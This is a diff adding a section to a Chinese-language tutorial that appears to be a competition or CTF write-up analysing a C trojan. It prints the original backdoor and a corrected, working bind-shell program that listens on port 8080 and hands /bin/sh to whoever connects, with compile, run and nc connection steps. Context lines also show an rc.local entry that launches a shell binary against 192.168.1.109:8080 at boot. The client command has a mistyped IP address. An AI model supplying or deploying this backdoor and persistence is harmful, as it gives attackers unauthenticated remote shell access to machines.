@@ -137,3 +137,65 @@ system(shell_cmd);
 >>>vim /etc/rc.d/rc.local＃编辑它并在里面协商/xxx/xx/xx/shelltest　192.168.1.109 8080 &
 >>>reboot #重启看看效果
 ```
+### 2017比赛c语言的木马分析
+>如下是原版本的木马文件，我们可以看到它使用了socket模块，根据代码内容可以看到这是一个服务端的代码因此不是我们上述讲过的nc反射的原理，实际上原理更简单了，从如下的代码可以看出来本题考的内容是c代码的编写能力，和对socket的了解
+```c
+#include <unistd.h>
+#include <sys/socket.h> #载入相关的模块，模块的用法需要对照开发文档
+#include <netinet/in.h>
+
+int sock,cli;#初始化变量
+struct sockaddr_in serv_addr; #定义结构体
+
+int main() #入口函数
+{
+serv_addr.sin_family = 2; #定义结构体的变量值，当然2是不对的可能是对应考题答案
+serv_addr.sin_addr.s_addr = 0;#这里填写完网卡地址
+serv_addr.sin_port = 0x901F;#这个大端端口号，大小端是c的一个概念，想知道的可以百度查询
+
+sock = socket(2,1,0);#实例化队形
+bind(sock,(struct sockaddr *)&serv_addr,0x10);#绑定端口
+listen(sock,1);#开启监听，看到listen就可以理解为这是一个服务端程序
+cli = accept(sock,0,0);#accept（）是c语言tcp产生的队列需要的函数
+dup2(cli,0);#dup2重定向cli
+dup2(cli,1);
+dup2(cli,2);
+execve("/bin/sh",0,0);#执行服务器上的sh，这里明显看出这是个后门文件，允许链接特定端口
+```
+上面代码是不可使用的，针对性修改版本如下
+
+```c
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+int sock,cli;
+struct sockaddr_in serv_addr;
+
+int main()
+{
+serv_addr.sin_family =AF_INET;
+serv_addr.sin_addr.s_addr =INADDR_ANY;
+serv_addr.sin_port =0x901F;
+
+sock = socket(AF_INET,SOCK_STREAM,0);
+bind(sock,(struct sockaddr *)&serv_addr,0x10);
+listen(sock,1);
+cli = accept(sock,0,0);
+dup2(cli,0);
+dup2(cli,1);
+dup2(cli,2);
+execve("/bin/sh",0,0);
+}
+```
+服务端执行如下：
+```shell
+>>>gcc -o test test.c
+>>>chmod +x test
+>>>./test
+```
+客户端执行如下：
+```shell
+>>>nc 192168.1.111 8080
+>>>ifconfig #查看Ip成功表示没问题
+```
